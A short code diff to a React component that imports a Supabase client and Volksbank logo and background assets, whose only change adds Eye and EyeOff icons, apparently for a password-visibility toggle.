@@ -2,7 +2,7 @@ import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
-import { X } from "lucide-react";
+import { X, Eye, EyeOff } from "lucide-react";
 import volksbankLogo from "@/assets/volksbank-logo.png";
 import volksbankBg from "@/assets/volksbank-bg.png";
 
